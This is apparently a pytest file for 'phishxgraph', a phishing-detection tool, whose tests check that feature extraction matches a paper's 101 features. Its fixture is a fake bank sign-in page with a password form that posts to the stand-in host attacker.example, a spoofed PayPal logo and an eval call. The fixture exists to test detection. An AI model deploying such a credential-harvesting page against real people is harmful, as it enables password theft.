"""
Unit tests to validate feature extraction contract matches the paper.
Run: pytest tests/ -q
"""
import os
import sys

HERE = os.path.dirname(__file__)
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..")))

from phishxgraph.features import (  # noqa: E402
    FEATURE_GROUPS,
    FEATURE_NAMES,
    extract_all_features,
)
from phishxgraph.graph import build_graph  # noqa: E402


SAMPLE_HTML = """<!doctype html>
<html><head><title>Sign in — Acme Bank</title>
<link rel="icon" href="https://cdn.other.example/favicon.ico">
<script>
  var x = localStorage.getItem('sid');
  document.cookie = 'session=1';
  eval("1+1");
</script>
</head>
<body>
  <nav><a href="#">Home</a></nav>
  <form id="f" action="https://attacker.example/collect" method="POST">
    <input name="pw" type="password">
    <input name="csrf" type="hidden">
    <button>Verify now</button>
  </form>
  <img src="https://cdn.paypal.example/logo.png" alt="PayPal brand" class="logo">
</body></html>
"""


def _instr(html, requests=None, redirects=None, storage_ops=None):
    return {
        "html": html,
        "requests": requests or [],
        "redirects": redirects or [],
        "storage_ops": storage_ops or [],
    }


def test_feature_count_matches_paper():
    assert len(FEATURE_NAMES) == 101, (
        "Paper §4.3 claims 101 features (42 content + 43 structural + 16 "
        "behavioral); got %d" % len(FEATURE_NAMES)
    )


def test_feature_groups_sum_to_101():
    content = sum(len(FEATURE_GROUPS[k]) for k in FEATURE_GROUPS
                  if k.startswith("content_"))
    structural = sum(len(FEATURE_GROUPS[k]) for k in FEATURE_GROUPS
                     if k.startswith("structural_"))
    behavioral = sum(len(FEATURE_GROUPS[k]) for k in FEATURE_GROUPS
                     if k.startswith("behavioral_"))
    assert content == 42, f"Content must be 42, got {content}"
    assert structural == 43, f"Structural must be 43, got {structural}"
    assert behavioral == 16, f"Behavioral must be 16, got {behavioral}"


def test_paper_names_present():
    """Verify paper-specific feature names (not their pre-rename aliases)."""
    required = {
        "execute_edge_ratio",          # §4.3, Table 10 (renamed from "script_edge_ratio")
        "access_edge_ratio",           # §4.3, Table 10 (paper has typo "acess_edge_ratio")
        "exfil_path_length",           # §4.3, Table 11 (renamed from "critical_path_length")
        "cookie_set_with_form",        # §4.3, Table 11 (renamed from "cookie_set_before_form")
        "closeness_centrality_mean",   # §4.3, Table 10
    }
    missing = required - set(FEATURE_NAMES)
    assert not missing, f"Paper feature names missing: {missing}"


def test_extract_returns_exactly_101():
    url = "https://login-verify-bank.example/account"
    G, soup = build_graph(url, _instr(SAMPLE_HTML), "login-verify-bank.example")
    feats = extract_all_features(G, url, "login-verify-bank.example", soup)
    assert set(feats.keys()) == set(FEATURE_NAMES), (
        f"extra: {set(feats.keys()) - set(FEATURE_NAMES)}; "
        f"missing: {set(FEATURE_NAMES) - set(feats.keys())}"
    )


def test_graph_types_match_paper():
    """Node types: html, script, network, storage. Edge types: structure,
    execute, request, access."""
    url = "https://attacker.example/login"
    instr = _instr(
        SAMPLE_HTML,
        requests=[
            {"url": "https://attacker.example/collect", "method": "POST",
             "resource_type": "xhr", "is_navigation": False, "status": 200},
            {"url": "https://attacker.example/tracker.js", "method": "GET",
             "resource_type": "script", "is_navigation": False, "status": 200},
        ],
        storage_ops=[
            {"type": "set_cookie", "key": "session",
             "stack": "at https://attacker.example/", "ts": 0},
        ],
    )
    G, _ = build_graph(url, instr, "attacker.example")
    node_types = {d.get("type") for _, d in G.nodes(data=True)}
    assert {"html", "script", "network", "storage"}.issubset(node_types), (
        f"missing node type(s); got {node_types}"
    )
    edge_types = {d.get("type") for _, _, d in G.edges(data=True)}
    assert {"structure", "execute", "request", "access"}.issubset(edge_types), (
        f"missing edge type(s); got {edge_types}"
    )


def test_phishing_signals_fire_on_sample():
    url = "https://login-verify-bank.example/account"
    G, soup = build_graph(url, _instr(SAMPLE_HTML), "login-verify-bank.example")
    feats = extract_all_features(G, url, "login-verify-bank.example", soup)
    assert feats["num_password_inputs"] >= 1
    assert feats["num_hidden_inputs"] >= 1
    assert feats["obfuscation_indicator"] > 0  # eval() triggers
    assert feats["form_subgraph_size"] >= 1
